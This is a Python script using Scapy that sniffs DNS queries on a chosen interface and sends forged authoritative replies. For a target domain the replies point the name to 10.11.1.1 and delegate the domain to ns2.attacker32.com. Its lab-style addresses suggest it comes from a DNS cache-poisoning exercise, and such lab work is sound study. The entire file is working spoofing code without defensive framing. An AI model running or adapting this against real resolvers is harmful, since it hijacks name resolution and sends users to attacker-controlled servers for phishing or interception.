#!/usr/bin/env python3
from scapy.all import *
import sys

def spoof_dns(pkt):
  global domain
  if (DNS in pkt and domain in pkt[DNS].qd.qname.decode('utf-8')):
    pkt.show()

    # Swap the source and destination IP address
    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

    # Swap the source and destination port number
    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

    # The Answer Section
    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                 ttl=259200, rdata='10.11.1.1')
    
    # The Authority Section
    NSsec1 = DNSRR(rrname=domain+'.', type='NS',
                   ttl=259200, rdata='ns2.attacker32.com.')

    # Construct the DNS packet
    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=1, arcount=0,
                 an=Anssec, ns=NSsec1)

    # Construct the entire IP packet and send it out
    spoofpkt = IPpkt/UDPpkt/DNSpkt
    send(spoofpkt)
  else:
    # prints the packets source IP address
    print("#"*80)
    print("Source IP:", pkt[IP].src)
    print("#"*80)
   

# Sniff UDP query packets and invoke spoof_dns().
f = 'udp and src host 10.9.0.53 and dst port 53'
global domain

try:
    domain = sys.argv[1]
except:
    print("Domain name is required please enter the domain name:")
    domain = input()
    if domain == '':
    	print("Domain name cannot be empty")
    	exit(1)

try:
    iface = sys.argv[2]
except:
    print("Interface is required please enter the interface:")
    iface = input()
    if iface == '':
    	print("Interface name cannot be empty")
    	exit(1)
pkt = sniff(iface=iface, filter=f, prn=spoof_dns)      
